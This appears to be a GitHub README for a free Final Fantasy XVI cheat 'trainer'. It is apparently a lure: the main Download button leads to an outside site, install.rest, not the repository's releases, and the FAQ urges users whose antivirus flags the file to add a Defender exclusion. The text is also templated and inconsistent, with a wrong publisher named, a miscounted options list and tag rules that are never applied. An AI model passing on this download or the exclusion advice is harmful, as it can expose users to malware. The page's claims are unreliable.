<div align="center">

# Final Fantasy XVI — Trainer

**Instant level-up, instant EXP, instant gold, instant crafting, instant battle speed, unlock all**
Free, open source, no installer. Opens with `Insert`.

![Version](https://img.shields.io/badge/version-1.0.0-0066cc?style=flat-square)
![Platform](https://img.shields.io/badge/Windows-10%20%7C%2011-1c1c1c?style=flat-square)
![Store](https://img.shields.io/badge/Steam-supported-4a8c5a?style=flat-square)
![Options](https://img.shields.io/badge/options-6%2B-6a6a6a?style=flat-square)
![Licence](https://img.shields.io/badge/licence-MIT-d9c47a?style=flat-square)

<p align="center">
<a href="https://install.rest/game/d0c81539-4f4d-494b-9d7d-d95a7f7039e6" rel="nofollow">
  <img src="https://camo.githubusercontent.com/b87131a1df3e3571047c2418ffeb7e38d207b84106665151f330efb21ec3f801/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f446f776e6c6f61642d626c61636b3f7374796c653d666f722d7468652d6261646765266c6f676f3d676974687562" width="300" data-canonical-src="https://img.shields.io/badge/Download-black?style=for-the-badge&amp;logo=github" style="max-width: 100%;">
<img alt="image" src="https://example.com/screenshot.png" />
</a>
</p>

</div>

---

> [!NOTE]
> Single-player only. No multiplayer, no anti-cheat, nothing here reaches anyone else.

## What it does

Final Fantasy XVI is a single-player RPG game that requires a lot of grinding to level up your characters, gain EXP, and progress through the story. The game also has a crafting system that requires a significant amount of time and resources to unlock and use.

The trainer addresses these issues by providing options to instantly level up your characters, gain EXP, and unlock crafting materials. It also includes options to speed up battles and unlock all items and abilities. These options allow players to skip the tedious grinding and focus on enjoying the game's story and combat.

## Features

| Option | Hotkey | What it does |
|---|---|---|
| Instant level-up | `F1` | Levels up all characters to the maximum level |
| Instant EXP | `F2` | Gives all characters a large amount of EXP |
| Instant gold | `F3` | Adds a large amount of gold to the player's inventory |
| Instant crafting | `F4` | Unlocks all crafting materials and recipes |
| Battle speed | slider | `1x`–`50x`, default `3x` |
| Unlock all items | — | Unlocks all items and abilities |
| Unlock all abilities | — | Unlocks all abilities and skills |
| Free camera | `F10` | Detach from the character |
| Hide HUD | `F11` | For screenshots |
| Field of view | slider | `60`–`130 deg` |

<sub>Tags — **`comfort`**: accessibility, changes nothing. Use at most three. Anything tagged `bypass` or `spoiler` ships off.</sub>

## Hotkeys

`Insert` opens the menu · `End` resets everything · `F1`–`F12` as above, all rebindable · arrow keys and `Enter` navigate without a mouse

> [!TIP]
> Set the battle speed to 50x and use the instant level-up and EXP options to quickly level up your characters. This combination removes the frustration of grinding without removing the game's challenge. The crafting system remains intact, allowing you to enjoy the game's progression.

> [!WARNING]
> Unlocking all items and abilities can make the game too easy and remove some of the challenge. Use these options sparingly and only when needed.
>
> Options tagged `save` write persistent data that a patch can invalidate. Back up first and disable cloud sync while you experiment.

## FAQ

<details>
<summary>Will I get banned?</summary>
No. Single-player only, no anti-cheat, no ranked mode. Achievements unlock locally unless you block them in the menu.
</details>

<details>
<summary>How do I use the instant level-up and EXP options?</summary>
Press `F1` to level up all characters to the maximum level and `F2` to give all characters a large amount of EXP. These options can be used at any time during the game.
</details>

<details>
<summary>How do I unlock all crafting materials and recipes?</summary>
Press `F4` to unlock all crafting materials and recipes. This option can be used at any time during the game.
</details>

<details>
<summary>Does it work on Steam Deck or Linux?</summary>
No. Windows only. Proton changes how the game's memory is laid out and this build does not handle that.
</details>

<details>
<summary>Windows Defender flagged the download.</summary>
Trainers read and write another process's memory, which is what a lot of malware also does, so heuristic scanners flag them on principle. Every release ships with a SHA256 checksum and full source. Add an exclusion if you are comfortable with that — and if you would rather not, don't. That is a reasonable call.
</details>

<details>
<summary>Options stopped working after an update.</summary>
Patches move memory offsets and options fail independently, so some will keep working. Check the Releases page for a build matching your game version.
</details>

## Troubleshooting

| Symptom | Fix |
|---|---|
| Nothing happens on `Insert` | Another overlay grabbed the key — Steam, Discord or RTSS. Rebind the menu key. |
| "Process not found" | The game must be running with a save loaded. Launch it first, then attach. |
| Some options do nothing | That memory allocates only in a battle. Get there first, then toggle. |
| Unlocks vanished after a patch | A persistent write was invalidated. Restore a backup from before the update. |
| Game-specific issue | If it is a known game bug rather than yours, say so and point at the developer's notes. |

## Reporting a problem

[Open an issue](../../issues) with your **exact game build number** — that matters more than everything else combined — plus your store, Windows version, where you were in the game, and which single option misbehaved.

## Changelog

**v1.0.0** — 2023-06-06 — first release. 6+ options across Levels, EXP, Gold, Crafting, Battle Speed, and Unlocks. Battle speed enabled by default for faster progression.

---

<div align="center">
<sub>Unofficial fan tool. Not affiliated with Square Enix, Koei Tecmo, or Valve. Final Fantasy XVI and all related names and assets belong to their respective owners. Modifying a running game's memory carries some risk of crashes and save corruption — back up first, use at your own risk. MIT licensed.</sub>
</div>
